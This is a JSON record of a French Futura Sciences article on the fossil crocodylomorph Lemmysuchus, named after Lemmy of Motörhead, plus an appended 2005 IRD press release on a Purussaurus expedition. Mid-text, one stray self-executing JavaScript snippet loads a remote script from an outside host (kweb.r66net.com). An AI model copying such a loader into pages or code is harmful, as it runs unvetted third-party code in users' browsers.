{"title": "Un crocodile géant baptisé Lemmy en hommage au leader de Motörhead", "newspaper": "Futura Sciences", "author": "Jean-Luc Goudet", "date_publi": "10/08/2017", "content": "Un crocodile fossile de près de six mètres vient d'être baptisé en l'honneur du rocker Ian Fraser Kilmister, plus connu sous le nom de Lemmy. Cette nouvelle espèce n'est pas une découverte mais la reclassification d'un crocodilomorphe marin qui vivait sur Terre il y a plus de 160 millions d'années. L'anecdote n'est pas à ranger dans la rubrique « people » mais en paléontologie, dans l'histoire du Jurassique et de sa faune. Ce qu'il faut retenir Un cousin de nos crocodiles qui vivait au Jurassique moyen était jusque-là confondu avec une autre espèce. Il a fallu lui créer un nouveau genre :  Lemmysuchus , en hommage à Lemmy, le leader du groupe de  heavy metal  Motörhead. L'étude montre la diversité de cette grande famille, qui peuplait à l'époque toute la planète. Devant l'allure du  crâne  de ce  fossile ,  Lorna Steel , conservatrice au  Natural History Museum  (NHM, Londres), a proposé de baptiser celui-ci en l'honneur de Ian Fraser Kilmister (1945-2015), leader du groupe Motörhead,  alias  « Lemmy » et dont elle dit être une fan. Voilà donc  Lemmysuchus , littéralement « le  crocodile  de Lemmy », intronisé dans le bestiaire du  Jurassique  moyen, un nouveau genre de la famille des téléosauridés. C'est ce qu'elle explique dans un  communiqué du NHM , estimant que le pionnier du  heavy metal  aurait aimé boire un verre à la santé  « d'une des plus méchantes créatures marines ayant vécu sur la  Terre  » . L'animal était présent il y a 164 millions d'années, dans les eaux côtières de ce qui est aujourd'hui l'Europe. Il mesurait 5,80 m environ et son crâne atteignait 1 m. D'après  Michela Johnson , doctorante et coauteur de l'article paru dans le  Zoological Journal of the Linnean Society , il devait être l'un des plus grands prédateurs de ce milieu. En fait découvert au siècle dernier, ce crocodilomorphe n'est pas un inconnu. Sa famille, les téléosauridés, disparue à la fin du Jurassique ou au début du  Crétacé , comprend plusieurs espèces, cousines des  crocodiliens  actuels. Le crocodile de Lemmy vient d'attraper une proie. © Mark Witton, NHM                               Un monde de redoutables crocodilomorphes Ces téléosauridés étaient largement répartis sur le Globe, présents sur la Laurasie et le  Gondwana , les deux  supercontinents  de l'époque, situés respectivement au nord et au sud de la planète. Avec leur museau pointu, ils ressemblaient à nos gavials et font partie de ces  crocodilomorphes  adaptés à la vie marine (avec les métriorhynchidés). Pourtant, leurs dents larges paraissent très bien adaptées pour casser les coquillages et même briser des carapaces de  tortues .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Un crocodile géant avec des dents de tyrannosaure vient d’être identifié Les fossiles sont nombreux car ces  reptiles  étaient diversifiés avant la catastrophe de la fin du Crétacé. Sur la terre ferme, la taille respectable d'autres cousins, montés sur des pattes bien plus hautes, devait en faire de redoutables prédateurs, qui n'avaient rien à envier aux  dinosaures   carnivores . C'était par exemple le cas de Razana, avec sa longueur de 7 m pour un poids voisin de la tonne. Le crâne d'un  Steneosaurus leedsi  (ici en photo) avait été retrouvé dans la même formation argileuse que le fossile de  Lemmysuchus  et les deux avaient d'abord été classés dans le même genre. Mais les différences sont trop nombreuses. Par exemple, le  Steneosaurus leedsi , avec son museau très allongé et sa dentition plus fine, semble davantage adapté pour se nourrir de poissons plutôt que de coquillages. © NHM                               Que s'est-il passé à la fin du Jurassique ? La classification est malaisée car les squelettes, incomplets, forment des sortes de puzzles. C'est l'un d'eux qu'ont revisité Michela Johnson et ses collègues, en étudiant des restes d'une  espèce  jusque-là baptisée  Steneosaurus obtusidens . Mauvaise classification, ont conclu ces paléontologistes. Le fossile ne peut appartenir à ce genre. Il fallut donc lui en forger un nouveau. Ainsi apparut  Lemmysuchus obtusidens . La  faune  de cette époque n'est qu'imparfaitement connue. Il reste notamment à comprendre ce qui a causé la disparition de nombreuses espèces à la  fin du Jurassique , sur les terres émergées comme dans les océans. L'histoire des crocodilomorphes, très affectés lors de cette transition vers le Crétacé, a sûrement beaucoup de choses à nous apprendre. Pour en savoir plus Mission en Amazonie péruvienne : à la recherche d'un crocodile géant Communiqué de l' IRD  publié le 15 août 2005 Samedi 13 août 2005, pour la première fois depuis cinquante ans, une équipe d'une dizaine de scientifiques de l'IRD et d'autres organismes péruviens sont partis en expédition sur l'arche de Fitzcarrald, en Amazonie péruvienne, pour trouver des restes de  vertébrés  géants fossiles et, plus particulièrement, du  Purussaurus , un  crocodile  géant âgé de 20 millions d'années. Il y a une cinquantaine d'années, un  maxillaire  du crocodile géant  Purussaurus  a été découvert lors d'une première expédition sur l'Arche de Fitzcarrald, dans le Sud de l'Amazonie péruvienne, et a permis la reconstitution du crâne présentée au Musée d'Histoire Naturelle de l'Université de San Marcos de Lima (MUSM). Depuis, cette zone riche de grands vertébrés fossiles mais très difficile d'accès n'a fait l'objet d'aucune mission scientifique. Cette région est d'autant plus intéressante qu'elle est en altitude et fortement incisée par les cours d'eau, qui mettent ainsi au jour les  sédiments  les plus anciens du  bassin  amazonien. Reconstitution du crâne du  Purussaurus  réalisée par le MUSM (comparé au grand caïman noir actuel). © François Pujos (IFEA)                               Le 13 août 2005, quand les cours d'eau sont à leur plus bas niveau et permettent d'observer plus facilement les  affleurements  géologiques, une dizaine de scientifiques (géologues, paléobotanistes et paléontologues) français et péruviens de l'IRD, du LMTG (UR-154), de Perupetro, de l'IFEA (Institut français d'études andines) et du MUSM sont partis en expédition sur l'arche de Fitzcarrald, entre le village d'Atalaya et le Rio Inuya afin de trouver des restes de vertébrés géants fossiles et, plus particulièrement, du crocodile géant  Purussaurus , et d'étudier leurs paléoenvironnements géologiques, climatiques et biologiques. Localisation de l'aire de prospection de l'expédition Fitzcarrald 2005. © IRD                               Depuis deux ans, des géologues et des paléontologues de l'IRD et du LMTG de Toulouse (UR-154), de Perupetro, de l'IFEA et du Musée d'Histoire Naturelle de l'Université de San Marcos de Lima (MUSM) ont créé un projet pluridisciplinaire ayant comme objectif de reconstituer l'histoire géologique et paléoenvironnementale (paléodiversité, paléoclimat et  paléogéographie ) du bassin amazonien durant ces vingt derniers millions d'années. Les premières missions scientifiques réalisées en Amazonie péruvienne dans le cadre de ce projet ont révélé une extrême richesse en fossiles de vertébrés, et plus particulièrement en restes de crocodiliens, parmi lesquels le crocodile géant  Purussaurus  est particulièrement bien représenté. ", "theme": "planete"}